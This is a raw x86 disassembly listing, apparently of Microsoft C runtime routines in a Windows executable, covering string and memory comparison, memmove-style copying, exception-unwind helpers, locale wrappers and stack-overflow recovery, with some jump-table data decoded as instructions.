  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
